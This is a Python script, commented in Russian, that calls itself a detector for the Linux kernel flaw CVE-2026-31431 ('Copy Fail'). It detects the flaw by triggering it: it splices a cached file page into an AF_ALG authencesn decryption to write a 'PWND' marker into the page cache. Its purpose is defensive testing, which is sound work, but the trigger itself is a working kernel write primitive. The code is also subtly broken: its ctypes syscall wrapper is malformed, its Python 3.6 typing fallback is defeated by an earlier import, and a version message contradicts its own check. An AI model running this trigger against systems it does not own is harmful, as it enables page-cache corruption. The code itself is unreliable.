#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# CVE-2026-31431 ("Copy Fail") vulnerability detector — Python 3.6 compatible
#
# Exit codes: 0 = NOT vulnerable, 2 = VULNERABLE, 1 = test error

from __future__ import print_function
import errno
import os
import socket
import struct
import sys
import tempfile
import ctypes
import ctypes.util
from typing import Optional, Tuple

# --- Типы для совместимости с 3.6 ---
try:
    from typing import Optional, Tuple
except ImportError:
    # Fallback для очень старых 3.6 без typing
    Optional = lambda x: x
    Tuple = lambda *a: tuple

# --- Константы ядра ---
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_OP_DECRYPT = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
PAGE = 4096
ASSOCLEN = 8
CRYPTLEN = 16
TAGLEN = 16
MARKER = b"PWND"

# --- Системные вызовы через ctypes (для Python < 3.10) ---
_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

# Определение сигнатур syscall
_syscall = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, *([ctypes.c_long] * 6))

def _make_syscall(num):
    return _syscall(ctypes.c_long(num), ctypes.c_long, ctypes.c_long,
                    ctypes.c_long, ctypes.c_long, ctypes.c_long, ctypes.c_long)

# Номера syscall для x86_64 (для других архитектур нужно заменить)
# https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
SPLICE_SYSCALL = 275  # x86_64

def _splice(fd_in, off_in, fd_out, off_out, length, flags):
    """Вызов splice() напрямую через syscall (совместимо с 3.6)"""
    func = _make_syscall(SPLICE_SYSCALL)
    res = func(
        ctypes.c_int(fd_in),
        ctypes.c_void_p(off_in) if off_in is not None else ctypes.c_void_p(0),
        ctypes.c_int(fd_out),
        ctypes.c_void_p(off_out) if off_out is not None else ctypes.c_void_p(0),
        ctypes.c_size_t(length),
        ctypes.c_uint(flags)
    )
    if res < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return res

# Флаги для splice
SPLICE_F_MOVE = 0x01
SPLICE_F_NONBLOCK = 0x02
SPLICE_F_MORE = 0x04
SPLICE_F_GIFT = 0x08


def build_authenc_keyblob(authkey, enckey):
    # type: (bytes, bytes) -> bytes
    """Собирает keyblob для authenc алгоритма"""
    rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey


def precheck():
    # type: () -> Optional[str]
    """Проверяет доступность необходимых функций ядра"""
    if not os.path.exists("/proc/crypto"):
        return "/proc/crypto missing"
    
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.close()
    except OSError as e:
        return "AF_ALG socket family unavailable ({})".format(getattr(e, 'strerror', e))
    
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", ALG_NAME))
        s.close()
    except OSError as e:
        return "{!r} cannot be instantiated ({})".format(
            ALG_NAME, getattr(e, 'strerror', e))
    
    return None


def attempt_trigger(target_path):
    # type: (str) -> Tuple[bool, bytes]
    """Пытается триггернуть уязвимость на временном файле"""
    sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!\n" * (PAGE // 32))[:PAGE]
    
    with open(target_path, "wb") as f:
        f.write(sentinel)

    # Заполняем page cache
    fd_target = os.open(target_path, os.O_RDONLY)
    os.read(fd_target, PAGE)
    os.lseek(fd_target, 0, os.SEEK_SET)

    # Создаём master socket и настраиваем ключ
    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    master.bind(("aead", ALG_NAME))
    master.setsockopt(
        SOL_ALG, ALG_SET_KEY,
        build_authenc_keyblob(b"\x00" * 32, b"\x00" * 16),
    )
    op, _ = master.accept()

    # AAD: первые 4 байта — SPI, следующие 4 — seqno_lo (наш маркер)
    aad = b"\x00" * 4 + MARKER
    
    # Control messages для sendmsg
    cmsg = [
        (SOL_ALG, ALG_SET_OP, struct.pack("I", ALG_OP_DECRYPT)),
        (SOL_ALG, ALG_SET_IV, struct.pack("I", 16) + b"\x00" * 16),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", ASSOCLEN)),
    ]
    
    # sendmsg с контрольными сообщениями
    op.sendmsg([aad], cmsg, socket.MSG_MORE)

    # Splice через syscall (вместо os.splice)
    pr, pw = os.pipe()
    try:
        n = _splice(fd_target, 0, pw, None, CRYPTLEN + TAGLEN, SPLICE_F_MOVE)
        if n != CRYPTLEN + TAGLEN:
            raise RuntimeError("splice file->pipe short: {}".format(n))
        n = _splice(pr, None, op.fileno(), None, n, SPLICE_F_MOVE)
        if n != CRYPTLEN + TAGLEN:
            raise RuntimeError("splice pipe->op short: {}".format(n))
    except OSError as e:
        os.close(pr)
        os.close(pw)
        op.close()
        master.close()
        os.close(fd_target)
        if e.errno in (errno.EOPNOTSUPP, errno.ENOTSUP):
            raise RuntimeError(
                "splice into AF_ALG socket not supported on this kernel - "
                "the page-cache attack vector is not reachable here"
            )
        raise

    # Запускаем дешифровку (ожидаем EBADMSG — это нормально)
    try:
        op.recv(ASSOCLEN + CRYPTLEN + TAGLEN)
    except OSError as e:
        if e.errno not in (errno.EBADMSG, errno.EINVAL):
            raise

    # Cleanup
    op.close()
    master.close()
    os.close(pr)
    os.close(pw)

    # Читаем обратно из page cache
    os.lseek(fd_target, 0, os.SEEK_SET)
    after = os.read(fd_target, PAGE)
    os.close(fd_target)

    return after, sentinel


def kernel_in_affected_line():
    # type: () -> bool
    """Эвристика: проверяет, попадает ли ядро в диапазон уязвимых версий"""
    rel = os.uname().release.split("-")[0]
    parts = rel.split(".")
    try:
        major, minor = int(parts[0]), int(parts[1])
    except (ValueError, IndexError):
        return False
    return (major, minor) >= (6, 12)


def main():
    # type: () -> int
    print("[*] CVE-2026-31431 detector kernel={} arch={}".format(
        os.uname().release, os.uname().machine))
    
    if not kernel_in_affected_line():
        print("[i] Kernel {} predates the affected 6.12/6.17/6.18 lines; "
              "trigger may not apply even if prerequisites match.".format(
                  os.uname().release))

    reason = precheck()
    if reason:
        print("[+] Precondition not met ({}). NOT vulnerable.".format(reason))
        return 0
    
    print("[+] AF_ALG + {!r} loadable - precondition met.".format(ALG_NAME))

    tmp = tempfile.mkdtemp(prefix="copyfail-")
    target = os.path.join(tmp, "sentinel.bin")
    
    try:
        after, sentinel = attempt_trigger(target)
    except Exception as e:
        print("[!] Trigger failed: {}: {}".format(type(e).__name__, e))
        return 1
    finally:
        try:
            os.remove(target)
            os.rmdir(tmp)
        except OSError:
            pass

    # Анализ результата
    marker_off = after.find(MARKER)
    marker_orig = sentinel.find(MARKER)
    diffs = [i for i in range(PAGE) if after[i] != sentinel[i]]

    if marker_off >= 0 and marker_orig < 0:
        ctx = after[max(marker_off - 4, 0):marker_off + 12]
        print("[!] VULNERABLE to CVE-2026-31431.")
        print("[!] Marker {!r} (AAD seqno_lo) landed in the spliced "
              "page-cache page at offset {}.".format(MARKER, marker_off))
        print("[!] Surrounding bytes: {} ({!r})".format(ctx.hex(), ctx))
        print("[!] Apply the upstream fix or block algif_aead immediately.")
        return 2

    if diffs:
        first = diffs[0]
        window = after[first:first + 16]
        print("[!] Page cache MODIFIED via in-place AEAD splice path "
              "({} bytes changed, first at offset {}).".format(len(diffs), first))
        print("[!] Window: {}".format(window.hex()))
        print("[!] The controllable scratch-write marker did not land, but "
              "the kernel still allowed a page-cache page into the writable "
              "AEAD destination scatterlist.")
        print("[!] Treat as VULNERABLE to the underlying bug class until "
              "a patched kernel is installed.")
        return 2

    print("[+] Page cache intact. NOT vulnerable on this kernel.")
    return 0


if __name__ == "__main__":
    sys.exit(main())